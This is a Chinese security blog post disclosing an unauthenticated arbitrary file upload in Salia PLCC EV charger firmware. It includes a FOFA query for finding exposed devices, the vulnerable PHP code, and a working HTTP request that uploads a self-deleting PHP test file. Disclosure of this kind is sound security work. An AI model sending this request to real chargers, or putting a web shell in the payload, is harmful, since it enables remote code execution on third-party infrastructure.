---
title: "Salia PLCC firmware.php 任意文件上传漏洞"
source: https://mrxn.net/jswz/salia-firmware-upload-rce.html
asset_dir: assets/salia-plcc-firmware.php-任意文件上传漏洞
---

# Salia PLCC firmware.php 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/1 08:17
- 856浏览
- [0评论](#comment)
- 34分钟阅读

深入探索

服务器

授权

软件

---

# 漏洞简介

Salia PLCC 的 eCHARGE 系列提供适用于家庭、企业和公共场所的智能电动汽车充电解决方案，具备高效充电、动态负载管理和光伏系统集成等功能的充电站。其充电管理系统 `firmware.php` 存在任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，允许未授权攻击者利用此漏洞向服务器上传任意文件，如 php 文件进行[代码执行](https://mrxn.net/tag/rce)获取系统权限。

消费类电子产品

# 影响版本

<=2.2.0（最新版）

# fofa语法

> `"Salia PLCC"`

# 漏洞分析

看下 `firmware.php` 的业务逻辑实现，如下

```
<?php
    try{
        if($_SERVER['REQUEST_METHOD']=='POST'){
            $uploadManager=new \UploadManager\Upload('media');
            $chunks=$uploadManager->upload('uploads');
            if(!empty($chunks)){
                foreach($chunks as $chunk){
                    echo '<br><b>';
                    echo '<p>'.$chunk->getNameWithExtension().$lang->tx('!upload1').'</p>';
                    echo '<br>';
                    echo '<p>'.$lang->tx('!upload2').'</p>';
                    echo '<br></b>';

                    $fw_install = True;

                    // Start Firmware Update

                    // mqtt message mit update und filename raus
                    // file ist in /srv/uploads ...
                    // filename mit uebergeben ...
                    // redirect nach reboot.php ...
                    // port0/salia/updatefirmware <filename>

                    $update_ready = True;
                    $update_filename = $chunk->getNameWithExtension();
                }
            }
        }
    }catch(\UploadManager\Exceptions\Upload $exception){
        //if file exists: (user selects a file)
        if(!empty($exception->getChunk())){
            foreach($exception->getChunk()->getErrors() as $error){
                echo '<p>'.$error.'</p>';
            }
        }else{
            echo '<p>'.$exception->getMessage().'</p>';
        }
    }
?>
```

- 代码仅在请求方法为POST时执行上传逻辑。
- 使用了`\UploadManager\Upload`类处理名为`media`的上传文件。
- 调用`upload('uploads')`方法，上传文件保存到`uploads`目录

看下 `UploadManager/Upload.php` 里 upload 方法的实现

漏洞修复方案

```
public function upload($path=null,$nameWithExtension=null,$uniqueNameInPath=false,$offset=null,$length=null)
{
    //set upload path
    foreach($this->chunks as $chunk){
        if(!empty($nameWithExtension)){
            $chunk->setNameAndExtension($nameWithExtension);
        }

        //check if name is unique in that path?
        if(!empty($uniqueNameInPath)){
            $name=static::findUniqueName($path,$chunk->getName(),$chunk->getExtension());
            $chunk->setName($name);
        }

        if(empty($path)){
            $path='./';
        }

        $chunk->setSavePath($path);
    }

    //validation
    if ($this->validate() === false) {
        $message=null;
        foreach($this->errors as $error){
            $message.=$error.PHP_EOL;
        }
        throw new UploadException($message);
    }

    foreach ($this->chunks as $chunk) {
        $this->applyCallback('beforeUpload', $chunk);

        $chunk->save(null,$offset,$length);

        $this->applyCallback('afterUpload', $chunk);
    }
    return $this->chunks;
}
```

对于文件名，路径，无任何过滤或校验，导致任意[文件上传漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。总体执行流程如下图所示

网络安全

[![Salia PLCC firmware.php 任意文件上传漏洞](images/img-001-8273797a677e.webp)](https://image.mrxn.net/6ad7f43ff5514c65b05c79780b50a46a.webp)

# 漏洞复现

```
POST /firmware.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Host: salia.mrxn.net

------WebKitFormBoundary
Content-Disposition: form-data; name="media"; filename="1.php"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundary--
```

成功上传 `1.php` 文件

[![Salia PLCC firmware.php 任意文件上传漏洞](images/img-002-443561c865cd.webp)](https://image.mrxn.net/0ae3c11f08b54ef4ac5b2490c12d4e51.webp)

访问上传文件 `/uploads/1.php`

[![Salia PLCC firmware.php 任意文件上传漏洞](images/img-003-dee70c5a4b2a.webp)](https://image.mrxn.net/5b31894712024ef3be170e051812a5d3.webp)

成功执行上传代码

计算机服务器

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
